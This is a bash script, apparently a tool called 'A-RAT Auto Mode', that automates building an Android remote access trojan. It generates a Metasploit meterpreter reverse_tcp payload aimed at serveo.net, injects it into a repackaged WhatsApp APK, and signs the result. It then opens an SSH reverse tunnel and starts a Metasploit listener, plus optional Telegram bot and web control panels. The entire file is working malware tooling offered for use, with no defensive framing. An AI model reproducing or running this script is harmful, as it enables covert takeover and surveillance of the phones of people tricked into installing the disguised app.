#!/bin/bash

GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}"
echo "█████╗ ██████╗  █████╗ ████████╗"
echo "██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "███████║██████╔╝███████║   ██║"
echo "██╔══██║██╔═══╝ ██╔══██║   ██║"
echo "██║  ██║██║     ██║  ██║   ██║"
echo "╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝"
echo "        A-RAT Auto Mode by Ahmad"
echo -e "${NC}"

# 1. Check dependencies
echo "[*] Checking dependencies..."
for pkg in apktool metasploit msfvenom ssh curl; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo "[!] Missing: $pkg. Installing..."
        sudo apt install -y $pkg
    fi
done

# 2. Generate payload
echo "[*] Generating Android payload..."
mkdir -p output
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=4545 -o output/payload.apk

# 3. Bind payload with WhatsApp
echo "[*] Binding payload with WhatsApp..."
cp binder/base_apps/whatsapp.apk output/original.apk
apktool d output/original.apk -o output/orig_decoded
apktool d output/payload.apk -o output/payload_decoded
cp -r output/payload_decoded/smali/com/metasploit/ output/orig_decoded/smali/com/
apktool b output/orig_decoded -o output/final.apk

# 4. Sign the APK
echo "[*] Signing APK..."
keytool -genkey -v -keystore rat.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass ratpass -keypass ratpass -dname "CN=A-RAT,O=Ahmad,C=PK"
jarsigner -verbose -keystore rat.keystore -storepass ratpass -keypass ratpass output/final.apk ratkey

# 5. Start Serveo tunnel
echo "[*] Starting Serveo tunnel..."
ssh -R 4545:localhost:4545 serveo.net &
sleep 5

# 6. Start Metasploit listener
echo "[*] Starting Metasploit listener..."
cat <<EOF > msf.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4545
exploit
EOF

gnome-terminal -- bash -c "msfconsole -r msf.rc; exec bash"

# 7. Start Telegram bot (if configured)
if [[ -f telegram/bot.py ]]; then
  echo "[*] Starting Telegram Bot..."
  python3 telegram/bot.py &
fi

# 8. Start web panel (Flask)
if [[ -f panel/app.py ]]; then
  echo "[*] Launching Flask Web Control Panel..."
  cd panel && python3 app.py &
fi

echo "[✔] Auto setup completed!"
echo "[📁] Final APK: output/final.apk"
